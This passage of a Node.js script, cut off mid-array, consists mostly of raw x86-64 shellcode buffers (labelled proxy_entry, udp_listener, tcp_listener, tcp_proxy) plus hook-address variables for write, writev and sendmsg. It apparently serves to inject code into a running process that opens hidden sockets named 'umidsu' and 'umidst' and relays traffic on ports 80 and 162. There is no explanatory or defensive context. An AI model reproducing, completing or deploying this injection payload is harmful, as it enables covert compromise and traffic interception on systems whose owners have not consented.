#!/usr/bin/env node

const fs = require('fs');
const path = require('path');
const { spawn, execFile } = require("child_process");
const { promisify } = require("util");
const execFileAsync = promisify(execFile);
const net = require('net');

let ADDR_FWRITE_PTR, ADDR_WRITE_PTR, ADDR_RET_PTR_ZERO,ADDR_WRITEV_PTR,ADDR_WRITEV_REPLACE,ADDR_RET_PTR_NONE,ADDR_RET_PTR_SIZE,ADDR_SEND_PTR,ADDR_session_io_event_PTR,ADDR_SENDMSG_REPLACE,ADDR_SENDMSG_PTR;

let g_code_replace;

let g_tcp_listen_port = 80;

let g_udp_listen_port = 162;

const g_proxy_entry_phy = Buffer.from([

	0xF3, 0x0F, 0x1E, 0xFA, 0x55, 0x48, 0x89, 0xE5, 0x48, 0x81, 0xEC, 0x80, 0x05, 0x00, 0x00, 0x48, 
	0xC7, 0x45, 0xF8, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 
	0x45, 0xF8, 0x48, 0x8B, 0x45, 0xF8, 0x48, 0xBA, 0xC0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 
	0x48, 0x21, 0xD0, 0x48, 0x05, 0x00, 0x02, 0x00, 0x00, 0x48, 0x89, 0x45, 0xF0, 0x48, 0x8B, 0x45, 
	0xF0, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x45, 0xE8, 0x48, 0x8B, 0x45, 0xE8, 0x48, 0x05, 0x70, 0x0D, 
	0x67, 0x02, 0x48, 0x89, 0x45, 0xE0, 0x48, 0x8B, 0x45, 0xE8, 0x48, 0x8B, 0x80, 0x90, 0xD3, 0xFE, 
	0x04, 0x48, 0x89, 0x45, 0xD8, 0x48, 0x8B, 0x45, 0xE8, 0x48, 0x8B, 0x80, 0x68, 0xF4, 0xFE, 0x04, 
	0x48, 0x89, 0x45, 0xD0, 0x48, 0x8B, 0x45, 0xE8, 0x48, 0x8B, 0x80, 0xD8, 0xDD, 0xFE, 0x04, 0x48, 
	0x89, 0x45, 0xC8, 0x48, 0x8B, 0x45, 0xE8, 0x48, 0x8B, 0x80, 0x90, 0xD6, 0xFE, 0x04, 0x48, 0x89, 
	0x45, 0xC0, 0x48, 0x8B, 0x45, 0xE8, 0x48, 0x8B, 0x80, 0x00, 0xC8, 0xFE, 0x04, 0x48, 0x89, 0x45, 
	0xB8, 0x48, 0x8B, 0x45, 0xE8, 0x48, 0x05, 0x00, 0x5C, 0x46, 0x00, 0x48, 0x89, 0x45, 0xB0, 0x48, 
	0x8B, 0x4D, 0xE0, 0x48, 0x8B, 0x55, 0xB0, 0x48, 0x8D, 0x45, 0x90, 0x4C, 0x8B, 0x45, 0xD8, 0xBE, 
	0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0xC7, 0x41, 0xFF, 0xD0, 0x48, 0x8B, 0x45, 0xE8, 0x48, 0x05, 
	0xF0, 0x43, 0x65, 0x02, 0x48, 0x89, 0x45, 0xA8, 0x48, 0x8B, 0x4D, 0xE0, 0x48, 0x8B, 0x55, 0xA8, 
	0x48, 0x8D, 0x45, 0x88, 0x4C, 0x8B, 0x45, 0xD8, 0xBE, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0xC7, 
	0x41, 0xFF, 0xD0, 0xC6, 0x85, 0x80, 0xFE, 0xFF, 0xFF, 0x2F, 0xC6, 0x85, 0x81, 0xFE, 0xFF, 0xFF, 
	0x6D, 0xC6, 0x85, 0x82, 0xFE, 0xFF, 0xFF, 0x69, 0xC6, 0x85, 0x83, 0xFE, 0xFF, 0xFF, 0x64, 0xC6, 
	0x85, 0x84, 0xFE, 0xFF, 0xFF, 0x00, 0x48, 0x8D, 0x85, 0x80, 0xFE, 0xFF, 0xFF, 0x48, 0x8B, 0x4D, 
	0xC8, 0xBA, 0xA4, 0x01, 0x00, 0x00, 0xBE, 0x41, 0x04, 0x00, 0x00, 0x48, 0x89, 0xC7, 0xFF, 0xD1, 
	0x89, 0x45, 0xA4, 0x48, 0x8D, 0x8D, 0x80, 0xFE, 0xFF, 0xFF, 0x8B, 0x45, 0xA4, 0x4C, 0x8B, 0x45, 
	0xD0, 0xBA, 0x04, 0x00, 0x00, 0x00, 0x48, 0x89, 0xCE, 0x89, 0xC7, 0x41, 0xFF, 0xD0, 0x48, 0x89, 
	0x45, 0x98, 0x8B, 0x45, 0xA4, 0x48, 0x8B, 0x55, 0xC0, 0x89, 0xC7, 0xFF, 0xD2, 0x90, 0xC9, 0xC3

]);

const g_udp_listener_phy = Buffer.from([

	0xF3, 0x0F, 0x1E, 0xFA, 0x55, 0x48, 0x89, 0xE5, 0x48, 0x81, 0xEC, 0x00, 0x10, 0x00, 0x00, 0x48, 
	0x83, 0x0C, 0x24, 0x00, 0x48, 0x81, 0xEC, 0xC0, 0x01, 0x00, 0x00, 0x48, 0x89, 0xBD, 0x48, 0xEE, 
	0xFF, 0xFF, 0x48, 0x8B, 0x85, 0x48, 0xEE, 0xFF, 0xFF, 0x48, 0x89, 0x45, 0xF8, 0x48, 0x8B, 0x45, 
	0xF8, 0x48, 0x8B, 0x40, 0x10, 0x48, 0x89, 0x45, 0xF0, 0x48, 0x8B, 0x45, 0xF0, 0x48, 0x8B, 0x80, 
	0xE8, 0xDD, 0xFE, 0x04, 0x48, 0x89, 0x45, 0xE8, 0x48, 0x8B, 0x45, 0xF0, 0x48, 0x8B, 0x80, 0x18, 
	0xF8, 0xFE, 0x04, 0x48, 0x89, 0x45, 0xE0, 0x48, 0x8B, 0x45, 0xF0, 0x48, 0x8B, 0x80, 0x58, 0xF1, 
	0xFE, 0x04, 0x48, 0x89, 0x45, 0xD8, 0x48, 0x8B, 0x45, 0xF0, 0x48, 0x8B, 0x80, 0x90, 0xD6, 0xFE, 
	0x04, 0x48, 0x89, 0x45, 0xD0, 0x48, 0x8B, 0x45, 0xF0, 0x48, 0x8B, 0x80, 0x40, 0xD8, 0xFE, 0x04, 
	0x48, 0x89, 0x45, 0xC8, 0x48, 0x8B, 0x45, 0xF0, 0x48, 0x8B, 0x80, 0x70, 0xBD, 0xFE, 0x04, 0x48, 
	0x89, 0x45, 0xC0, 0x48, 0x8B, 0x45, 0xF0, 0x48, 0x8B, 0x80, 0xA8, 0xD4, 0xFE, 0x04, 0x48, 0x89, 
	0x45, 0xB8, 0x48, 0x8B, 0x45, 0xF0, 0x48, 0x8B, 0x80, 0xB0, 0xAC, 0xFE, 0x04, 0x48, 0x89, 0x45, 
	0xB0, 0x48, 0x8B, 0x45, 0xF0, 0x48, 0x8B, 0x80, 0x80, 0xD1, 0xFE, 0x04, 0x48, 0x89, 0x45, 0xA8, 
	0xC7, 0x45, 0xA4, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x45, 0xE8, 0xBA, 0x00, 0x00, 0x00, 0x00, 
	0xBE, 0x02, 0x00, 0x00, 0x00, 0xBF, 0x02, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0x89, 0x45, 0xA0, 0x83, 
	0x7D, 0xA0, 0xFF, 0x75, 0x0A, 0xB8, 0x00, 0x00, 0x00, 0x00, 0xE9, 0x1B, 0x04, 0x00, 0x00, 0x48, 
	0x8B, 0x45, 0xE8, 0xBA, 0x00, 0x00, 0x00, 0x00, 0xBE, 0x02, 0x00, 0x00, 0x00, 0xBF, 0x02, 0x00, 
	0x00, 0x00, 0xFF, 0xD0, 0x89, 0x45, 0x9C, 0x83, 0x7D, 0x9C, 0xFF, 0x75, 0x0A, 0xB8, 0x00, 0x00, 
	0x00, 0x00, 0xE9, 0xF3, 0x03, 0x00, 0x00, 0x48, 0xC7, 0x85, 0x70, 0xFF, 0xFF, 0xFF, 0x03, 0x00, 
	0x00, 0x00, 0x48, 0xC7, 0x85, 0x78, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x95, 
	0x70, 0xFF, 0xFF, 0xFF, 0x8B, 0x45, 0xA0, 0x4C, 0x8B, 0x4D, 0xB8, 0x41, 0xB8, 0x10, 0x00, 0x00, 
	0x00, 0x48, 0x89, 0xD1, 0xBA, 0x15, 0x00, 0x00, 0x00, 0xBE, 0x01, 0x00, 0x00, 0x00, 0x89, 0xC7, 
	0x41, 0xFF, 0xD1, 0x48, 0x8D, 0x95, 0x70, 0xFF, 0xFF, 0xFF, 0x8B, 0x45, 0xA0, 0x4C, 0x8B, 0x4D, 
	0xB8, 0x41, 0xB8, 0x10, 0x00, 0x00, 0x00, 0x48, 0x89, 0xD1, 0xBA, 0x14, 0x00, 0x00, 0x00, 0xBE, 
	0x01, 0x00, 0x00, 0x00, 0x89, 0xC7, 0x41, 0xFF, 0xD1, 0x48, 0x8D, 0x95, 0x70, 0xFF, 0xFF, 0xFF, 
	0x8B, 0x45, 0x9C, 0x4C, 0x8B, 0x4D, 0xB8, 0x41, 0xB8, 0x10, 0x00, 0x00, 0x00, 0x48, 0x89, 0xD1, 
	0xBA, 0x15, 0x00, 0x00, 0x00, 0xBE, 0x01, 0x00, 0x00, 0x00, 0x89, 0xC7, 0x41, 0xFF, 0xD1, 0x48, 
	0x8D, 0x95, 0x70, 0xFF, 0xFF, 0xFF, 0x8B, 0x45, 0x9C, 0x4C, 0x8B, 0x4D, 0xB8, 0x41, 0xB8, 0x10, 
	0x00, 0x00, 0x00, 0x48, 0x89, 0xD1, 0xBA, 0x14, 0x00, 0x00, 0x00, 0xBE, 0x01, 0x00, 0x00, 0x00, 
	0x89, 0xC7, 0x41, 0xFF, 0xD1, 0x66, 0xC7, 0x85, 0x00, 0xFF, 0xFF, 0xFF, 0x01, 0x00, 0xC6, 0x85, 
	0x02, 0xFF, 0xFF, 0xFF, 0x2F, 0xC6, 0x85, 0x03, 0xFF, 0xFF, 0xFF, 0x75, 0xC6, 0x85, 0x04, 0xFF, 
	0xFF, 0xFF, 0x6D, 0xC6, 0x85, 0x05, 0xFF, 0xFF, 0xFF, 0x69, 0xC6, 0x85, 0x06, 0xFF, 0xFF, 0xFF, 
	0x64, 0xC6, 0x85, 0x07, 0xFF, 0xFF, 0xFF, 0x73, 0xC6, 0x85, 0x08, 0xFF, 0xFF, 0xFF, 0x75, 0xC6, 
	0x85, 0x09, 0xFF, 0xFF, 0xFF, 0x00, 0x48, 0x8D, 0x85, 0x00, 0xFF, 0xFF, 0xFF, 0x48, 0x8D, 0x50, 
	0x02, 0x48, 0x8B, 0x45, 0xB0, 0x48, 0x89, 0xD7, 0xFF, 0xD0, 0x48, 0x8D, 0x8D, 0x00, 0xFF, 0xFF, 
	0xFF, 0x8B, 0x45, 0xA0, 0x4C, 0x8B, 0x45, 0xD8, 0xBA, 0x10, 0x00, 0x00, 0x00, 0x48, 0x89, 0xCE, 
	0x89, 0xC7, 0x41, 0xFF, 0xD0, 0x89, 0x45, 0xA4, 0x83, 0x7D, 0xA4, 0x00, 0x74, 0x0A, 0xB8, 0x00, 
	0x00, 0x00, 0x00, 0xE9, 0xC2, 0x02, 0x00, 0x00, 0xC7, 0x45, 0x98, 0x00, 0x10, 0x00, 0x00, 0xC7, 
	0x85, 0x5C, 0xEE, 0xFF, 0xFF, 0x10, 0x00, 0x00, 0x00, 0xB8, 0x00, 0x00, 0x00, 0x00, 0xB9, 0x10, 
	0x00, 0x00, 0x00, 0x48, 0x8D, 0x95, 0x80, 0xEE, 0xFF, 0xFF, 0x48, 0x89, 0xD7, 0xFC, 0xF3, 0x48, 
	0xAB, 0x89, 0xF8, 0x89, 0xCA, 0x89, 0x55, 0x94, 0x89, 0x45, 0x90, 0x8B, 0x45, 0xA0, 0x8D, 0x50, 
	0x3F, 0x85, 0xC0, 0x0F, 0x48, 0xC2, 0xC1, 0xF8, 0x06, 0x89, 0xC6, 0x48, 0x63, 0xC6, 0x48, 0x8B, 
	0xBC, 0xC5, 0x80, 0xEE, 0xFF, 0xFF, 0x8B, 0x45, 0xA0, 0x99, 0xC1, 0xEA, 0x1A, 0x01, 0xD0, 0x83, 
	0xE0, 0x3F, 0x29, 0xD0, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x89, 0xC1, 0x48, 0xD3, 0xE2, 0x48, 0x89, 
	0xD0, 0x48, 0x09, 0xC7, 0x48, 0x89, 0xFA, 0x48, 0x63, 0xC6, 0x48, 0x89, 0x94, 0xC5, 0x80, 0xEE, 
	0xFF, 0xFF, 0x8B, 0x45, 0x9C, 0x8D, 0x50, 0x3F, 0x85, 0xC0, 0x0F, 0x48, 0xC2, 0xC1, 0xF8, 0x06, 
	0x89, 0xC6, 0x48, 0x63, 0xC6, 0x48, 0x8B, 0xBC, 0xC5, 0x80, 0xEE, 0xFF, 0xFF, 0x8B, 0x45, 0x9C, 
	0x99, 0xC1, 0xEA, 0x1A, 0x01, 0xD0, 0x83, 0xE0, 0x3F, 0x29, 0xD0, 0xBA, 0x01, 0x00, 0x00, 0x00, 
	0x89, 0xC1, 0x48, 0xD3, 0xE2, 0x48, 0x89, 0xD0, 0x48, 0x09, 0xC7, 0x48, 0x89, 0xFA, 0x48, 0x63, 
	0xC6, 0x48, 0x89, 0x94, 0xC5, 0x80, 0xEE, 0xFF, 0xFF, 0x8B, 0x45, 0xA0, 0x3B, 0x45, 0x9C, 0x7E, 
	0x05, 0x8B, 0x45, 0xA0, 0xEB, 0x03, 0x8B, 0x45, 0x9C, 0x89, 0x45, 0x8C, 0x8B, 0x45, 0x8C, 0x8D, 
	0x78, 0x01, 0x48, 0x8D, 0x85, 0x80, 0xEE, 0xFF, 0xFF, 0x4C, 0x8B, 0x4D, 0xA8, 0x41, 0xB8, 0x00, 
	0x00, 0x00, 0x00, 0xB9, 0x00, 0x00, 0x00, 0x00, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0xC6, 
	0x41, 0xFF, 0xD1, 0x89, 0x45, 0xA4, 0x83, 0x7D, 0xA4, 0x00, 0x0F, 0x8E, 0xFF, 0xFE, 0xFF, 0xFF, 
	0x8B, 0x45, 0xA0, 0x8D, 0x50, 0x3F, 0x85, 0xC0, 0x0F, 0x48, 0xC2, 0xC1, 0xF8, 0x06, 0x48, 0x98, 
	0x48, 0x8B, 0xB4, 0xC5, 0x80, 0xEE, 0xFF, 0xFF, 0x8B, 0x45, 0xA0, 0x99, 0xC1, 0xEA, 0x1A, 0x01, 
	0xD0, 0x83, 0xE0, 0x3F, 0x29, 0xD0, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x89, 0xC1, 0x48, 0xD3, 0xE2, 
	0x48, 0x89, 0xD0, 0x48, 0x21, 0xF0, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0xA5, 0x00, 0x00, 0x00, 0x8B, 
	0x45, 0x98, 0x83, 0xE8, 0x01, 0x48, 0x63, 0xD0, 0x48, 0x8D, 0xBD, 0x5C, 0xEE, 0xFF, 0xFF, 0x48, 
	0x8D, 0x8D, 0x70, 0xEE, 0xFF, 0xFF, 0x48, 0x8D, 0xB5, 0x00, 0xEF, 0xFF, 0xFF, 0x8B, 0x45, 0xA0, 
	0x4C, 0x8B, 0x55, 0xC8, 0x49, 0x89, 0xF9, 0x49, 0x89, 0xC8, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x89, 
	0xC7, 0x41, 0xFF, 0xD2, 0x89, 0x45, 0x88, 0x83, 0x7D, 0x88, 0x00, 0x0F, 0x8E, 0x1C, 0x01, 0x00, 
	0x00, 0x66, 0xC7, 0x85, 0x60, 0xEE, 0xFF, 0xFF, 0x02, 0x00, 0x48, 0x8B, 0x45, 0xF8, 0x8B, 0x00, 
	0x89, 0x85, 0x64, 0xEE, 0xFF, 0xFF, 0x48, 0x8B, 0x45, 0xF8, 0x8B, 0x40, 0x04, 0x66, 0x89, 0x85, 
	0x62, 0xEE, 0xFF, 0xFF, 0x8B, 0x45, 0x88, 0x48, 0x63, 0xD0, 0x48, 0x8D, 0x8D, 0x60, 0xEE, 0xFF, 
	0xFF, 0x48, 0x8D, 0xB5, 0x00, 0xEF, 0xFF, 0xFF, 0x8B, 0x45, 0x9C, 0x4C, 0x8B, 0x55, 0xC0, 0x41, 
	0xB9, 0x10, 0x00, 0x00, 0x00, 0x49, 0x89, 0xC8, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x89, 0xC7, 0x41, 
	0xFF, 0xD2, 0x89, 0x45, 0x84, 0x83, 0x7D, 0x84, 0x00, 0x0F, 0x8F, 0x20, 0xFE, 0xFF, 0xFF, 0xE9, 
	0xC0, 0x00, 0x00, 0x00, 0x8B, 0x45, 0x9C, 0x8D, 0x50, 0x3F, 0x85, 0xC0, 0x0F, 0x48, 0xC2, 0xC1, 
	0xF8, 0x06, 0x48, 0x98, 0x48, 0x8B, 0xB4, 0xC5, 0x80, 0xEE, 0xFF, 0xFF, 0x8B, 0x45, 0x9C, 0x99, 
	0xC1, 0xEA, 0x1A, 0x01, 0xD0, 0x83, 0xE0, 0x3F, 0x29, 0xD0, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x89, 
	0xC1, 0x48, 0xD3, 0xE2, 0x48, 0x89, 0xD0, 0x48, 0x21, 0xF0, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0xDC, 
	0xFD, 0xFF, 0xFF, 0x8B, 0x45, 0x98, 0x83, 0xE8, 0x01, 0x48, 0x63, 0xD0, 0x48, 0x8D, 0xBD, 0x5C, 
	0xEE, 0xFF, 0xFF, 0x48, 0x8D, 0x8D, 0x60, 0xEE, 0xFF, 0xFF, 0x48, 0x8D, 0xB5, 0x00, 0xEF, 0xFF, 
	0xFF, 0x8B, 0x45, 0x9C, 0x4C, 0x8B, 0x55, 0xC8, 0x49, 0x89, 0xF9, 0x49, 0x89, 0xC8, 0xB9, 0x00, 
	0x00, 0x00, 0x00, 0x89, 0xC7, 0x41, 0xFF, 0xD2, 0x89, 0x45, 0x88, 0x83, 0x7D, 0x88, 0x00, 0x7E, 
	0x3F, 0x8B, 0x45, 0x88, 0x48, 0x63, 0xD0, 0x48, 0x8D, 0x8D, 0x70, 0xEE, 0xFF, 0xFF, 0x48, 0x8D, 
	0xB5, 0x00, 0xEF, 0xFF, 0xFF, 0x8B, 0x45, 0xA0, 0x4C, 0x8B, 0x55, 0xC0, 0x41, 0xB9, 0x10, 0x00, 
	0x00, 0x00, 0x49, 0x89, 0xC8, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x89, 0xC7, 0x41, 0xFF, 0xD2, 0x89, 
	0x45, 0x84, 0x83, 0x7D, 0x84, 0x00, 0x7E, 0x0B, 0xE9, 0x62, 0xFD, 0xFF, 0xFF, 0x90, 0xEB, 0x04, 
	0x90, 0xEB, 0x01, 0x90, 0x8B, 0x45, 0x9C, 0x48, 0x8B, 0x55, 0xD0, 0x89, 0xC7, 0xFF, 0xD2, 0x8B, 
	0x45, 0xA0, 0x48, 0x8B, 0x55, 0xD0, 0x89, 0xC7, 0xFF, 0xD2, 0xC9, 0xC3, 0xE9, 0xEF, 0x00, 0x00

]);

const g_tcp_listener_phy = Buffer.from([

	0xF3, 0x0F, 0x1E, 0xFA, 0x55, 0x48, 0x89, 0xE5, 0x48, 0x81, 0xEC, 0x50, 0x01, 0x00, 0x00, 0x48, 
	0x89, 0xBD, 0xB8, 0xFE, 0xFF, 0xFF, 0x48, 0x8B, 0x85, 0xB8, 0xFE, 0xFF, 0xFF, 0x48, 0x89, 0x45, 
	0xF8, 0x48, 0x8B, 0x45, 0xF8, 0x48, 0x8B, 0x40, 0x10, 0x48, 0x89, 0x45, 0xF0, 0x48, 0x8B, 0x45, 
	0xF0, 0x48, 0x8B, 0x80, 0xE8, 0xDD, 0xFE, 0x04, 0x48, 0x89, 0x45, 0xE8, 0x48, 0x8B, 0x45, 0xF0, 
	0x48, 0x8B, 0x80, 0x18, 0xF8, 0xFE, 0x04, 0x48, 0x89, 0x45, 0xE0, 0x48, 0x8B, 0x45, 0xF0, 0x48, 
	0x8B, 0x80, 0xF8, 0xDB, 0xFE, 0x04, 0x48, 0x89, 0x45, 0xD8, 0x48, 0x8B, 0x45, 0xF0, 0x48, 0x8B, 
	0x80, 0x50, 0xFE, 0xFE, 0x04, 0x48, 0x89, 0x45, 0xD0, 0x48, 0x8B, 0x45, 0xF0, 0x48, 0x8B, 0x80, 
	0xF8, 0xC5, 0xFE, 0x04, 0x48, 0x89, 0x45, 0xC8, 0x48, 0x8B, 0x45, 0xF0, 0x48, 0x8B, 0x80, 0x58, 
	0xF1, 0xFE, 0x04, 0x48, 0x89, 0x45, 0xC0, 0x48, 0x8B, 0x45, 0xF0, 0x48, 0x8B, 0x80, 0xE0, 0xF8, 
	0xFE, 0x04, 0x48, 0x89, 0x45, 0xB8, 0x48, 0x8B, 0x45, 0xF0, 0x48, 0x8B, 0x80, 0x10, 0xED, 0xFE, 
	0x04, 0x48, 0x89, 0x45, 0xB0, 0x48, 0x8B, 0x45, 0xF0, 0x48, 0x8B, 0x80, 0x90, 0xD6, 0xFE, 0x04, 
	0x48, 0x89, 0x45, 0xA8, 0x48, 0x8B, 0x45, 0xF0, 0x48, 0x8B, 0x80, 0x90, 0xD3, 0xFE, 0x04, 0x48, 
	0x89, 0x45, 0xA0, 0x48, 0x8B, 0x45, 0xF0, 0x48, 0x8B, 0x80, 0xC8, 0xF0, 0xFE, 0x04, 0x48, 0x89, 
	0x45, 0x98, 0x48, 0x8B, 0x45, 0xF0, 0x48, 0x8B, 0x80, 0x28, 0xD4, 0xFE, 0x04, 0x48, 0x89, 0x45, 
	0x90, 0x48, 0x8B, 0x45, 0xF0, 0x48, 0x8B, 0x80, 0xA8, 0xD4, 0xFE, 0x04, 0x48, 0x89, 0x45, 0x88, 
	0x48, 0x8B, 0x45, 0xF0, 0x48, 0x8B, 0x80, 0x80, 0xD1, 0xFE, 0x04, 0x48, 0x89, 0x45, 0x80, 0x48, 
	0x8B, 0x45, 0xF0, 0x48, 0x8B, 0x80, 0xB0, 0xAC, 0xFE, 0x04, 0x48, 0x89, 0x85, 0x78, 0xFF, 0xFF, 
	0xFF, 0xC7, 0x85, 0x74, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x45, 0xE8, 0xBA, 
	0x00, 0x00, 0x00, 0x00, 0xBE, 0x01, 0x00, 0x00, 0x00, 0xBF, 0x01, 0x00, 0x00, 0x00, 0xFF, 0xD0, 
	0x89, 0x85, 0x70, 0xFF, 0xFF, 0xFF, 0x83, 0xBD, 0x70, 0xFF, 0xFF, 0xFF, 0xFF, 0x75, 0x0A, 0xB8, 
	0x00, 0x00, 0x00, 0x00, 0xE9, 0x82, 0x01, 0x00, 0x00, 0x66, 0xC7, 0x85, 0xE0, 0xFE, 0xFF, 0xFF, 
	0x01, 0x00, 0xC6, 0x85, 0xE2, 0xFE, 0xFF, 0xFF, 0x2F, 0xC6, 0x85, 0xE3, 0xFE, 0xFF, 0xFF, 0x75, 
	0xC6, 0x85, 0xE4, 0xFE, 0xFF, 0xFF, 0x6D, 0xC6, 0x85, 0xE5, 0xFE, 0xFF, 0xFF, 0x69, 0xC6, 0x85, 
	0xE6, 0xFE, 0xFF, 0xFF, 0x64, 0xC6, 0x85, 0xE7, 0xFE, 0xFF, 0xFF, 0x73, 0xC6, 0x85, 0xE8, 0xFE, 
	0xFF, 0xFF, 0x74, 0xC6, 0x85, 0xE9, 0xFE, 0xFF, 0xFF, 0x00, 0x48, 0x8D, 0x85, 0xE0, 0xFE, 0xFF, 
	0xFF, 0x48, 0x8D, 0x50, 0x02, 0x48, 0x8B, 0x85, 0x78, 0xFF, 0xFF, 0xFF, 0x48, 0x89, 0xD7, 0xFF, 
	0xD0, 0x48, 0x8D, 0x8D, 0xE0, 0xFE, 0xFF, 0xFF, 0x8B, 0x85, 0x70, 0xFF, 0xFF, 0xFF, 0x4C, 0x8B, 
	0x45, 0xC0, 0xBA, 0x6E, 0x00, 0x00, 0x00, 0x48, 0x89, 0xCE, 0x89, 0xC7, 0x41, 0xFF, 0xD0, 0x89, 
	0x85, 0x74, 0xFF, 0xFF, 0xFF, 0x83, 0xBD, 0x74, 0xFF, 0xFF, 0xFF, 0x00, 0x74, 0x0A, 0xB8, 0x00, 
	0x00, 0x00, 0x00, 0xE9, 0xF3, 0x00, 0x00, 0x00, 0x8B, 0x85, 0x70, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 
	0x55, 0xB8, 0xBE, 0x10, 0x00, 0x00, 0x00, 0x89, 0xC7, 0xFF, 0xD2, 0x89, 0x85, 0x74, 0xFF, 0xFF, 
	0xFF, 0xC7, 0x85, 0xCC, 0xFE, 0xFF, 0xFF, 0x10, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x95, 0xCC, 0xFE, 
	0xFF, 0xFF, 0x48, 0x8D, 0x8D, 0xD0, 0xFE, 0xFF, 0xFF, 0x8B, 0x85, 0x70, 0xFF, 0xFF, 0xFF, 0x4C, 
	0x8B, 0x45, 0xB0, 0x48, 0x89, 0xCE, 0x89, 0xC7, 0x41, 0xFF, 0xD0, 0x89, 0x85, 0x6C, 0xFF, 0xFF, 
	0xFF, 0x83, 0xBD, 0x6C, 0xFF, 0xFF, 0xFF, 0xFF, 0x0F, 0x84, 0x8E, 0x00, 0x00, 0x00, 0x48, 0x8B, 
	0x45, 0x98, 0xBF, 0x18, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0x48, 0x89, 0x85, 0x60, 0xFF, 0xFF, 0xFF, 
	0x48, 0x8B, 0x85, 0x60, 0xFF, 0xFF, 0xFF, 0x8B, 0x95, 0x6C, 0xFF, 0xFF, 0xFF, 0x89, 0x10, 0x8B, 
	0x95, 0xD4, 0xFE, 0xFF, 0xFF, 0x48, 0x8B, 0x85, 0x60, 0xFF, 0xFF, 0xFF, 0x89, 0x50, 0x04, 0x0F, 
	0xB7, 0x85, 0xD2, 0xFE, 0xFF, 0xFF, 0x0F, 0xB7, 0xD0, 0x48, 0x8B, 0x85, 0x60, 0xFF, 0xFF, 0xFF, 
	0x89, 0x50, 0x08, 0x48, 0x8B, 0x85, 0x60, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x55, 0xF8, 0x48, 0x89, 
	0x50, 0x10, 0x48, 0x8B, 0x45, 0xF0, 0x48, 0x05, 0x00, 0x60, 0x46, 0x00, 0x48, 0x89, 0x85, 0x58, 
	0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x8D, 0x60, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x95, 0x58, 0xFF, 0xFF, 
	0xFF, 0x48, 0x8D, 0x85, 0xC0, 0xFE, 0xFF, 0xFF, 0x4C, 0x8B, 0x45, 0xA0, 0xBE, 0x00, 0x00, 0x00, 
	0x00, 0x48, 0x89, 0xC7, 0x41, 0xFF, 0xD0, 0xE9, 0x35, 0xFF, 0xFF, 0xFF, 0x90, 0x8B, 0x85, 0x70, 
	0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x55, 0xA8, 0x89, 0xC7, 0xFF, 0xD2, 0xC9, 0xC3, 0x66, 0x66, 0x2E

]);


const g_tcp_proxy_phy = Buffer.from([

	0xF3, 0x0F, 0x1E, 0xFA, 0x55, 0x48, 0x89, 0xE5, 0x48, 0x81, 0xEC, 0x00, 0x10, 0x00, 0x00, 0x48, 
	0x83, 0x0C, 0x24, 0x00, 0x48, 0x81, 0xEC, 0x40, 0x01, 0x00, 0x00, 0x48, 0x89, 0xBD, 0xC8, 0xEE, 
	0xFF, 0xFF, 0x48, 0x8B, 0x85, 0xC8, 0xEE, 0xFF, 0xFF, 0x48, 0x89, 0x45, 0xF8, 0x48, 0x8B, 0x45, 
	0xF8, 0x48, 0x8B, 0x40, 0x10, 0x48, 0x8B, 0x40, 0x10, 0x48, 0x89, 0x45, 0xF0, 0x48, 0x8B, 0x45, 
	0xF0, 0x48, 0x8B, 0x80, 0xE8, 0xDD, 0xFE, 0x04, 0x48, 0x89, 0x45, 0xE8, 0x48, 0x8B, 0x45, 0xF0, 
	0x48, 0x8B, 0x80, 0x18, 0xF8, 0xFE, 0x04, 0x48, 0x89, 0x45, 0xE0, 0x48, 0x8B, 0x45, 0xF0, 0x48, 
	0x8B, 0x80, 0xF8, 0xDB, 0xFE, 0x04, 0x48, 0x89, 0x45, 0xD8, 0x48, 0x8B, 0x45, 0xF0, 0x48, 0x8B, 
	0x80, 0x50, 0xFE, 0xFE, 0x04, 0x48, 0x89, 0x45, 0xD0, 0x48, 0x8B, 0x45, 0xF0, 0x48, 0x8B, 0x80, 
	0xF8, 0xC5, 0xFE, 0x04, 0x48, 0x89, 0x45, 0xC8, 0x48, 0x8B, 0x45, 0xF0, 0x48, 0x8B, 0x80, 0x58, 
	0xF1, 0xFE, 0x04, 0x48, 0x89, 0x45, 0xC0, 0x48, 0x8B, 0x45, 0xF0, 0x48, 0x8B, 0x80, 0x90, 0xD6, 
	0xFE, 0x04, 0x48, 0x89, 0x45, 0xB8, 0x48, 0x8B, 0x45, 0xF0, 0x48, 0x8B, 0x80, 0x28, 0xD4, 0xFE, 
	0x04, 0x48, 0x89, 0x45, 0xB0, 0x48, 0x8B, 0x45, 0xF0, 0x48, 0x8B, 0x80, 0xA8, 0xD4, 0xFE, 0x04, 
	0x48, 0x89, 0x45, 0xA8, 0x48, 0x8B, 0x45, 0xF0, 0x48, 0x8B, 0x80, 0x80, 0xD1, 0xFE, 0x04, 0x48, 
	0x89, 0x45, 0xA0, 0xC7, 0x45, 0x9C, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x45, 0xE8, 0xBA, 0x00, 
	0x00, 0x00, 0x00, 0xBE, 0x01, 0x00, 0x00, 0x00, 0xBF, 0x02, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0x89, 
